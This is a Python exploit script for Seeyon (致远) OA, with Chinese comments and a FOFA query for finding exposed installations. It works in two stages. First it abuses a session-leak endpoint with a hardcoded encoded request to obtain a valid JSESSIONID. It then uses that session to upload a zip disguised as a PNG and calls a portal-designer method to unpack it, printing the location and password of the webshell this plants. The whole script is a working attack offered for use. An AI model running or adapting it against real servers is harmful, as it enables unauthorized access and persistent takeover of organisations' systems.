#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
import time
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 脚本信息
######################################################
NAME='Seeyon_OA_SessionLeak_Upload'
AUTHOR="Joker"
REMARK='致远OA Session泄露 任意文件上传漏洞'
FOFA_RULE='title="致远OA'
######################################################

def poc(target):
    result = {}
    test_url1 = target + "/seeyon/thirdpartyController.do"
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=test_url1, headers=headers, data=data, verify=False, timeout=5)
        if response.status_code == 200 and "a8genius.do" in response.text:
            result['target'] = target
            result['poc'] = NAME
            return result
    except:
        pass

def exp(target_url):
    vuln_url = target_url + "/seeyon/thirdpartyController.do"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        if response.status_code == 200 and "a8genius.do" in response.text and 'set-cookie' in str(response.headers).lower():
            cookies = response.cookies
            cookies = requests.utils.dict_from_cookiejar(cookies)
            cookie = cookies['JSESSIONID']
            targeturl = target_url + '/seeyon/fileUpload.do?method=processUpload'
            print("[o] 目标 {} 正在上传压缩包文件.... \n[o] Cookie: {}".format(target_url, cookie))
            files = [('file1', ('360icon.png', open('platform.zip', 'rb'), 'image/png'))]
            headers = {'Cookie':"JSESSIONID=%s" % cookie}
            data = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver':"false", "type": '0','isEncrypt': "0"}
            response = requests.post(url=targeturl,files=files,data=data, headers=headers,timeout=60,verify=False)
            #print(response.text)
            reg = re.findall('fileurls=fileurls\+","\+\'(.+)\'',response.text,re.I)
            if len(reg)==0:
               sys.exit("上传文件失败")
            exp2(target_url, cookie, reg, headers)
        else:
            print("[x] 目标 {} 不存在漏洞".format(target_url))
    except Exception as e:
        pass

def exp2(target_url, cookie, reg, headers):
    vuln_url = target_url + '/seeyon/ajax.do'
    datestr = time.strftime('%Y-%m-%d')
    post = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + datestr + '%22%2C%22' + reg[0] + '%22%5D'

    headers['Content-Type']="application/x-www-form-urlencoded"
    print("[o] 目标 {} 正在解压文件....".format(target_url))
    try:
        response = requests.post(vuln_url, data=post,headers=headers,timeout=60,verify=False)
        if response.status_code == 500:
            print("[+]{}/seeyon/common/designer/pageLayout/123.jsp szxsd 默认Webshell地址".format(target_url))
        else:
            print("[x] 目标 {} 不存在漏洞".format(target_url))
    except Exception as e:
        pass


if __name__ == '__main__':
    poc("https://127.0.0.1")